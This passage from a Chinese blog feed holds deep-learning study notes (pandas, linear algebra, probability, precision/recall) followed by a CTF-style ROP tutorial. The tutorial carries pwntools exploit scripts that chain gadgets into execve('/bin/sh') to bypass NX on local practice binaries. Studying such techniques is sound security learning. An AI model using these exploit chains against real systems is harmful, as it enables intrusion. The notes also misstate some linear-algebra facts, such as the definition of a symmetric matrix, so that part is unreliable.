<th>C</th><br>      <th>B</th><br>      <th>A</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>2013-01-01</th><br>      <td>1.447731</td><br>      <td>0.731754</td><br>      <td>0.260564</td><br>      <td>-0.042893</td><br>    </tr><br>    <tr><br>      <th>2013-01-02</th><br>      <td>0.004012</td><br>      <td>0.823437</td><br>      <td>-0.848987</td><br>      <td>-1.282021</td><br>    </tr><br>    <tr><br>      <th>2013-01-03</th><br>      <td>0.897330</td><br>      <td>-0.571516</td><br>      <td>2.724175</td><br>      <td>-1.107000</td><br>    </tr><br>    <tr><br>      <th>2013-01-04</th><br>      <td>0.494642</td><br>      <td>-0.334988</td><br>      <td>-0.145260</td><br>      <td>1.550847</td><br>    </tr><br>    <tr><br>      <th>2013-01-05</th><br>      <td>0.846324</td><br>      <td>1.151775</td><br>      <td>0.398448</td><br>      <td>0.304897</td><br>    </tr><br>    <tr><br>      <th>2013-01-06</th><br>      <td>-0.709135</td><br>      <td>1.385415</td><br>      <td>-0.450565</td><br>      <td>0.484135</td><br>    </tr><br>  </tbody><br></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.sort_values(by=<span class="string">'B'</span>)  <span class="comment">#按值进行排序  加上by参数 表示按照那一列进行排序</span></span><br></pre></td></tr></table></figure><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>A</th><br>      <th>B</th><br>      <th>C</th><br>      <th>D</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>2013-01-02</th><br>      <td>-1.282021</td><br>      <td>-0.848987</td><br>      <td>0.823437</td><br>      <td>0.004012</td><br>    </tr><br>    <tr><br>      <th>2013-01-06</th><br>      <td>0.484135</td><br>      <td>-0.450565</td><br>      <td>1.385415</td><br>      <td>-0.709135</td><br>    </tr><br>    <tr><br>      <th>2013-01-04</th><br>      <td>1.550847</td><br>      <td>-0.145260</td><br>      <td>-0.334988</td><br>      <td>0.494642</td><br>    </tr><br>    <tr><br>      <th>2013-01-01</th><br>      <td>-0.042893</td><br>      <td>0.260564</td><br>      <td>0.731754</td><br>      <td>1.447731</td><br>    </tr><br>    <tr><br>      <th>2013-01-05</th><br>      <td>0.304897</td><br>      <td>0.398448</td><br>      <td>1.151775</td><br>      <td>0.846324</td><br>    </tr><br>    <tr><br>      <th>2013-01-03</th><br>      <td>-1.107000</td><br>      <td>2.724175</td><br>      <td>-0.571516</td><br>      <td>0.897330</td><br>    </tr><br>  </tbody><br></table><h5 id="Selection"><a href="#Selection" class="headerlink" title="Selection"></a>Selection</h5><h6 id="Getting"><a href="#Getting" class="headerlink" title="Getting"></a>Getting</h6><p>获取数据  可以按单个列获取数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'A'</span>]</span><br><span class="line"><span class="comment"># df.A  两种一样的效果</span></span><br></pre></td></tr></table></figure><pre><code>2013-01-01   -0.0428932013-01-02   -1.2820212013-01-03   -1.1070002013-01-04    1.5508472013-01-05    0.3048972013-01-06    0.484135Freq: D, Name: A, dtype: float64</code></pre><p>可以使用<code>[]</code>去进行分块  按行获取   因为这个东西以一行为一个数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="number">0</span>:<span class="number">3</span>]</span><br></pre></td></tr></table></figure><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>A</th><br>      <th>B</th><br>      <th>C</th><br>      <th>D</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>2013-01-01</th><br>      <td>-0.042893</td><br>      <td>0.260564</td><br>      <td>0.731754</td><br>      <td>1.447731</td><br>    </tr><br>    <tr><br>      <th>2013-01-02</th><br>      <td>-1.282021</td><br>      <td>-0.848987</td><br>      <td>0.823437</td><br>      <td>0.004012</td><br>    </tr><br>    <tr><br>      <th>2013-01-03</th><br>      <td>-1.107000</td><br>      <td>2.724175</td><br>      <td>-0.571516</td><br>      <td>0.897330</td><br>    </tr><br>  </tbody><br></table><h3 id="数学和信息论的一些概念"><a href="#数学和信息论的一些概念" class="headerlink" title="数学和信息论的一些概念"></a>数学和信息论的一些概念</h3><p>一般的AI里面。头部输入的一般是矩阵，涉及到线性代数，尾部会输出一个概率，这里就涉及到概率论的东西，两部分的话都涉及到一个信息论的一个知识，这里就瞎记录一些有的没的</p><h4 id="线性代数涉及到点："><a href="#线性代数涉及到点：" class="headerlink" title="线性代数涉及到点："></a>线性代数涉及到点：</h4><ol><li>unit（计算单元）一般分为四类</li></ol><ul><li style="list-style: none"><input type="checkbox"> 标量scalar 其实就是一个数，比如2.5</li><li style="list-style: none"><input type="checkbox"> 向量vector,就是一列数，横着写和竖着写都行，比如：[2.5,3.7,4.5,3.6]</li><li style="list-style: none"><input type="checkbox"> 矩阵matrix，就是一个矩阵，以刚才的例子就是50x50的一个矩阵</li><li style="list-style: none"><input type="checkbox"> 张量tesor,这个东西就在矩阵的基础上再添加多层数据，模型结构就类似一开始上面描述的三通道图片的数据格式，可以概括一下当数据超过二维的时候可以都把他描述成为张量</li></ul><ol start="2"><li><p>矩阵相乘<br>必须保证前后两个行数和列数是一致的<br>向量和矩阵相乘跟矩阵相乘的过程其实一样，我们只需要把向量看作是一个一行几列或者是一列几行的一个矩阵即可</p></li><li><p>向量与矩阵相加 </p><p>有一个broadcasting的过程，就是将向量扩展成与向量一样的大小</p></li><li><p>矩阵与矩阵相加<br>此时的broadcasting过程就跟向量相加的有点不一样了，此时填充的是0</p></li><li><p>矩阵的分配律<br>A(B+C) = AB +AC<br>A(BC) = (AB)C<br>注意矩阵没有交换律<br>(AB)的转置 = B的转置乘A的转置</p></li><li><p>单位矩阵  对角线全为1的矩阵  In表示，n表示nxn，也称为眼(eye)矩阵</p><p>单位矩阵的一些特性<br>InX = X 也就是单位矩阵和其他矩阵相乘还是等于那个矩阵</p></li><li><p>逆矩阵的概念<br>一个矩阵和一个矩阵的逆矩阵相乘就是单位矩阵</p></li><li><p>对角矩阵</p><p>对角线上有非零元素，其余元素都为0</p></li><li><p>对称矩阵：<br>满足一个特性：记A的对称矩阵为Ai，i是上标<br>则有AiA= AAi = 单位矩阵</p></li><li><p>行列式</p><p>形式|A|<br>行列式等于0有无穷解，行列式不等于0有唯一解</p></li><li><p>三角矩阵：分上三角和下三角</p></li><li><p>线性相关<br>比如：一次函数就是一个线性模型<br>在矩阵中的线性相关符合这样的关系：Ax = b</p></li><li><p>线性表示：<br>存在一组向量x，能够满足b=xA，说明b能够被A线性表示</p></li></ol><p>因为大自然中的任何东西都能够进行分解，所以给了人工智能很好的发展，很多大的东西都能通过叠加去构成，包括图片声音等等，然后一些最最基本的东西，不能分解的，称之为特征向量</p><h4 id="概率学"><a href="#概率学" class="headerlink" title="概率学"></a>概率学</h4><p>计算机科学所处理的内容大部分都是完全确定且必然的,程序员写程序时是假定CPU将完美执行每条机器指令,硬件错误是非常罕见并在编程阶段几乎不予考虑的，但机器学习中几乎处处都会使用概率,例如下列问题:</p><p>●评估一种疾病的爆发率</p><p>●预测货币交易在某时间点的市值</p><p>●理解一句话中每个词语间的关联含义</p><p>●判断一个交通标志是限速还是禁停</p><p>●判断-封邮件是否为垃圾邮件</p><p>●针对同类病人,研究其相近的DNA序列段</p><p>●生成与现实中相近的包与鞋子的搭配</p><p>几乎所有活动都需要能够在不确定性存在时进行推理。事实上,除了那些被定义为真的数学声明,我们很难认定某个命题是千真万确的或者确保某件事-定会发生。</p><p>不确定性有三种可能来源:</p><p>●被建模系统内在的随机性,例如纸牌游戏,开局时我们都是假设纸牌被洗为随机序列;</p><p>●不完全观测,例如砸金蛋,设置金蛋的人可以知道哪个金蛋里有大奖,但在砸金蛋人的角度大奖的概率是不确定的;</p><p>●不完全建模,例如三个杯子一 个硬币的游戏,将一 个硬币放在中间的杯子中,然后随意转换杯子的相互位置，如果不允许观察转换过程,则无法良好预测硬币最后再哪边的杯子中。</p><h4 id="信息论下涉及的一些东西"><a href="#信息论下涉及的一些东西" class="headerlink" title="信息论下涉及的一些东西"></a>信息论下涉及的一些东西</h4><p>对于一维的话就一个前后<br>二维的话就是加上普通坐标系可以表示出来的的东西<br>三维的话就是360度都可以<br>四维的话一般就是描述是加上时间<br>五维的话一般就是空间</p><p>四五维一般人类是无法掌握的，但是在信息论的角度下，信息是可以在这些维度中进行传输，比如数学界的傅里叶变换</p><p><strong>基本调论</strong>： 一个不太可能的时间发生需要比非常可能发生的更多的信息</p><p>1、如果想通过这种想法来量化信息,需注意以下特别几点:</p><p>2、非常可能发生的事件信息量比较少,极端情况下,确保总能够发生的事件应该没有信息量</p><p>3、较不可能发生的事件具有更高的信息量</p><p>4、独立事件应具有增量的信息。</p><h3 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h3><h4 id="如何进行论文的解读"><a href="#如何进行论文的解读" class="headerlink" title="如何进行论文的解读"></a>如何进行论文的解读</h4><p>1.question<br>2.frame(在这一部分就经常包含上述数学公式)<br>3.实验证明<br>4.业界对比</p><h4 id="人工智能"><a href="#人工智能" class="headerlink" title="人工智能"></a>人工智能</h4><p>人工智能，在于抽象，经验的总结概括 </p><p>最关键的一步在于：找特征！！！！</p><p>区分攻击行为一般两个方法：</p><p>1.寻找大牛<br>2.交给AI进行处理</p><h4 id="监督学习与非监督学习"><a href="#监督学习与非监督学习" class="headerlink" title="监督学习与非监督学习"></a>监督学习与非监督学习</h4><p>监督学习：有督促<br>非监督学习： 根据你已有的知识自己去获得，有一定的不可确定性</p><p>机器学习一般是属于监督学习<br>目的就是让cost不断地减小，一直进行目标的优化<br>然后的话就是需要提取特征</p><p>机器学习里面对于矩阵的定义一般都是竖着放的</p><p>数据处理的比例一般为： 6:2:2  训练 测试  验证</p><p>机器学习中最基本指标是召回率(Recall Rate)和准确率(Precision Rate)  召回率也叫查全率，准确率也叫查准率。<br><code>召回率=TP/(TP+FN)  准确率=TP/(TP+FP)</code></p><p>TP表示实际为真预测为真  </p><p>TN表示实际为假预测为假  </p><p>FN表示实际为真预测为假，通俗讲就是漏报了 </p><p>FP表示实际为假预测为真，通俗讲就是误报了</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;毕设要做，大概思路就是做一个类似D盾的扫描器，但是核心使用深度学习去进行研发，最后封装成一个Web端或者是一个客户端吧，实习期间断断续续地学，尽量在春节之后能够把核心的东西做出来吧。&lt;/p&gt;
&lt;p&gt;先记录一些点吧，比较零散，不知道怎么系统学,
    
    </summary>
    
      <category term="深度学习" scheme="0verwatch.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="深度学习与Web安全" scheme="0verwatch.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%8EWeb%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Rop初探一</title>
    <link href="0verwatch.top/pwn-rop1.html"/>
    <id>0verwatch.top/pwn-rop1.html</id>
    <published>2019-10-13T12:40:45.000Z</published>
    <updated>2019-10-13T12:42:07.601Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>保研成功后，发现落下东西太多，没办法慢慢补，除了将过去的Web题补一下之外入门一下pwn吧，最近看舍友的面试，好像对二进制都有要求，免得到时候找实习的时候说我不懂二进制，是时候学一学了，先学几个ROP技巧吧，今天学一个ROP调用sytemcall，<a id="more"></a>一些基础知识就跳过了XD</p><h4 id="关于栈保护的一些绕过（Protection）"><a href="#关于栈保护的一些绕过（Protection）" class="headerlink" title="关于栈保护的一些绕过（Protection）"></a>关于栈保护的一些绕过（Protection）</h4><p>1.<code>ASLR</code> （Address Space Layout Randomization地址随机化）</p><p>每次程序执行时 stack ，library，heap位置都不一样</p><p>检查是否开启ASLR ：<code>cat /proc/sys/kernel/randomize_va_space</code></p><p>一个案例：使用<code>ldd</code>命令产看当前使用的library，有时候pwn题环境需要提供对方服务器的libc库就是有可能双方环境不太一样，需要换一下</p><p><img src="https://s2.ax1x.com/2019/10/11/uLEK2R.png" alt="uLEK2R.png"></p><p>可以看到两次使用ls的时候（因为ls是libc里面的一个库函数，当然不止这一个），libc的地址是发生改变的</p><p>2.<code>DEP</code>（Data Execution Prevention 数据执行保护 又称NX）</p><p>可写的不可执行，可执行的不可写</p><p><img src="https://s2.ax1x.com/2019/10/11/uLV3Ss.png" alt="uLV3Ss.png"></p><p>每个段都给一定的权限，可以使用peda里面的vmmap命令去查看</p><p>3.<code>PIE</code>  （Position independent Execution）地址无关可执行文件</p><p>gcc在默认情况下没有开启，编译时加上-fPIC -pie就可以开启</p><p>没开启的情况下程序的data段以及code段会是固定的</p><p>一旦开启之后data以及code也会跟着ALSR，因此前面说的ret2text/shellcode没有固定位置可以跳，就变得难很多</p><p>4.<code>Stack Guard</code></p><p>编译器对stack overflow的一中保护机制，在函数被调用时，先在stack上放canary，函数返回前先检查这个值有没有被修改，可以有效防止缓冲区溢出</p><p><img src="https://s2.ax1x.com/2019/10/12/uO8KIA.png" alt="uO8KIA.png"></p><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>是一种利用现有程序片段组合出想要功能的技巧(Return Oriented Programming)</p><p>可以使用ROP解除DEP限制，然后执行shellcode</p><p>可以使用ROP绕过ASLR的限制</p><p>可以使用ROP绕过StackGuard</p><p>可以使用ROP绕过PIE</p><p>控制ROP行为的code是<code>“stack上排列的内容”</code></p><p><code>Gadget</code>：一小段以ret结尾的code</p><p>ROP Chain：串联在一起的gadget，组合出需要的功能</p><p>Gadget执行完以后，还可以继续return</p><p>只要在stack上按正确的顺序排列好每个gadget的address和对应的stack frame，就可以执行复杂的功能了</p><p><img src="https://s2.ax1x.com/2019/10/12/uOYvWR.png" alt="uOYvWR.png"></p><h5 id="使用ROP的关键："><a href="#使用ROP的关键：" class="headerlink" title="使用ROP的关键："></a>使用ROP的关键：</h5><p>1.查找gadget：</p><p>ROPGadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary  ./shellcode</span><br><span class="line"></span><br><span class="line">ROPgadget --binary  shellcode --opcode cd80c3</span><br><span class="line"></span><br><span class="line">cd80c3 //代表int 80; ret</span><br></pre></td></tr></table></figure><p>一般我们都是找单独有一条pop eax ； ret的语句前面有的任何东西可能都会是干扰</p><p>2.排列gadget</p><h5 id="ROP类型"><a href="#ROP类型" class="headerlink" title="ROP类型"></a>ROP类型</h5><p>1.控制寄存器做systemcall</p><p>2.使用原有程序里的function</p><p>3.使用libc里的gadget或function（前面两种一般用于绕过DEP保护，最后一种绕过ASLR）</p><p>如果想要检查一些这个二进制文件存在什么保护的话，可以使用gdb的checksec去检查</p><p><img src="https://s2.ax1x.com/2019/10/12/uONij0.png" alt="uONij0.png"></p><p>例子一（ROP做systemcall）：</p><p>使用checksec可以发现该二进制文件是存在NX的保护的</p><p>寻找gadget，可以存放进一个文件，再使用vim的一个搜索功能去搜索，使用n继续往下搜索合适的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./rop &gt; rop.txt</span><br></pre></td></tr></table></figure><p>用qira去调试，使其报错观察其返回地址的偏移量为22个bytes</p><p><img src="https://s2.ax1x.com/2019/10/13/uvd9QH.png" alt="uvd9QH.png"></p><p>然后寻找pop eax ； ret语句的一个地址，我们在exp里面可以测试一下，在qira里面观察其运行的步骤，注意这里面要加上一个返回地址，随意即可，不然的话qira回显不出来，可能跟程序的运行过程有关，还有rop也需要小端序，我们这里使用的是flat将整个rop小端序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b90f6</span></span><br><span class="line">rop = [</span><br><span class="line">        pop_eax_ret,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">r.sendline(<span class="string">'a'</span>*<span class="number">22</span> + flat(rop))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/13/uvcWjK.png" alt="uvcWjK.png"></p><p>这里可以观察到偏移量后加上pop eax的效果，该地址中的指令都是可以执行的，并且按照我的rop把3给存进eax中，经过ret命令后，EIP就会跳转到我瞎写的地址上，最后爆出错误</p><p>所以从这里开始开始构建systemcall，先构建read函数，根据表去构建即可</p><p><img src="https://s2.ax1x.com/2019/10/13/uvgh2q.png" alt="uvgh2q.png"></p><p>但是我们需要先把ebx，ecx，edx的相关指令给找出来，可以是连续的pop再ret，也可以是单个pop再ret</p><p>但是ecx参数需要传进可写的的buf指针，我们需要去找，这里有好几个方法，第一个直接在gdb中使用vmmap去发现可写段，也可以使用<code>&amp;</code>后台运行，然后cat他的maps去寻找可写段，另外也可以写bss段</p><p><img src="https://s2.ax1x.com/2019/10/13/uvWGrV.png" alt="uvWGrV.png"></p><p>但是找的可写段还是要有点技巧的，程序可写空间一般都不会用完，我们从最后的地址，也就是对应上图的0x080ee000，减去个100字节左右的空间，最后edx存放50个字节不超过上面ecx的就好，然后加上一个随机地址方便调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b90f6</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080595b3</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e7da</span></span><br><span class="line">buf = <span class="number">0x080ee000</span> - <span class="number">100</span></span><br><span class="line">rop = [</span><br><span class="line">        pop_eax_ret,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        pop_ebx_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        pop_ecx_ret,</span><br><span class="line">        buf,</span><br><span class="line">        pop_edx_ret,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">    <span class="number">0xdeadbeef</span></span><br><span class="line">]</span><br><span class="line">r.sendline(<span class="string">'a'</span>*<span class="number">22</span> + flat(rop))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>接下来要让系统执行该代码，就需要系统中断int 0x80，然后寻找这种代码可以使用这个命令<code>ROPgadget --binary  shellcode --opcode cd80c3</code>其中的cd80c3就是int 0x80，而–opcode代表按照操作符进行查找</p><p><img src="https://s2.ax1x.com/2019/10/13/uxPWxs.png" alt="uxPWxs.png"></p><p>帮刚才的调试地址更换为该地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b90f6</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080595b3</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e7da</span></span><br><span class="line">buf = <span class="number">0x080ee000</span> - <span class="number">100</span></span><br><span class="line">int_0x80_ret = <span class="number">0x0806ef00</span></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">        pop_eax_ret,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        pop_ebx_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        pop_ecx_ret,</span><br><span class="line">        buf,</span><br><span class="line">        pop_edx_ret,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        int_0x80_ret</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'a'</span>*<span class="number">22</span> + flat(rop))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>再使用qira进行调试可以发现，返回到int 0x80后会调用read函数，但是没有赋值</p><p><img src="https://s2.ax1x.com/2019/10/13/uxisyR.png" alt="uxisyR.png"></p><p>输入/bin/bash后就可以发现返回该字符串长度，内容存放在ecx中</p><p><img src="https://s2.ax1x.com/2019/10/13/uxFTCF.png" alt="uxFTCF.png"></p><p>下面最后一步就是调用系统函数去完成对/bin/sh或/bin/bash调用，同样我们只需要构造systemcall即可，eax赋值为0xb,ebx赋值要执行的命令,buf里的内容即可，ecx，edx赋值为0即可，别忘了系统调用，同时我们还需要给个输入，所以我们需要去sleep个2s，再给他发送一个<code>/bin/sh</code>，还需要<code>\x00</code>去做一个截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b90f6</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080595b3</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e7da</span></span><br><span class="line">buf = <span class="number">0x080ee000</span> - <span class="number">100</span></span><br><span class="line">int_0x80_ret = <span class="number">0x0806ef00</span></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">        pop_eax_ret,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        pop_ebx_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        pop_ecx_ret,</span><br><span class="line">        buf,</span><br><span class="line">        pop_edx_ret,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        int_0x80_ret</span><br><span class="line"></span><br><span class="line">pop_eax_ret,</span><br><span class="line">        <span class="number">0x0b</span>,</span><br><span class="line">        pop_ebx_ret,</span><br><span class="line">        buf,</span><br><span class="line">        pop_ecx_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        pop_edx_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        int_0x80_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'a'</span>*<span class="number">22</span> + flat(rop))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">r.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>例子二(simplerop)：</p><p><img src="https://s2.ax1x.com/2019/10/13/uxEI4f.png" alt="uxEI4f.png"></p><p>存在NX保护，需要rop去绕过，这里还是使用上面构造systemcall的方法来使用，尝试溢出，查找偏移量，偏移量为32个字节</p><p><img src="https://s2.ax1x.com/2019/10/13/uxVe56.png" alt="uxVe56.png"></p><p>构造好pwntools的框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line">rop = []</span><br><span class="line">r.sendline(<span class="string">'a'</span>*<span class="number">32</span> + flat(rop))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>开始寻找先可执行的代码<code>ROPgadget --binary ./simplerop &gt; simple.txt</code></p><p>然户寻找可写段</p><p><img src="https://s2.ax1x.com/2019/10/13/uxnnwd.png" alt="uxnnwd.png"></p><p>这个题目跟上面的有点不同就是寻找的ret语句，没有单一的 pop ecx，需要找组合的，最后还是要注意‘/bin/sh’需要加上\x00,不然的话读取的时候可能没限制地读了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx_ret = <span class="number">0x0806e851</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e82a</span></span><br><span class="line">int_0x80_ret = <span class="number">0x0806eef0</span></span><br><span class="line">buf = <span class="number">0x080ec304</span> - <span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">        pop_eax_ret,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        pop_ecx_ebx_ret,</span><br><span class="line">        buf,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        pop_edx_ret,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        int_0x80_ret,</span><br><span class="line"></span><br><span class="line">        pop_eax_ret,</span><br><span class="line">        <span class="number">0x0b</span>,</span><br><span class="line">        pop_ecx_ebx_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        buf,</span><br><span class="line">        pop_edx_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        int_0x80_ret</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'a'</span>*<span class="number">32</span> + flat(rop))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">r.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>oj8k,溢出成功</p><p><img src="https://s2.ax1x.com/2019/10/13/uxl7o4.png" alt="uxl7o4.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;保研成功后，发现落下东西太多，没办法慢慢补，除了将过去的Web题补一下之外入门一下pwn吧，最近看舍友的面试，好像对二进制都有要求，免得到时候找实习的时候说我不懂二进制，是时候学一学了，先学几个ROP技巧吧，今天学一个ROP调用sytemcall，
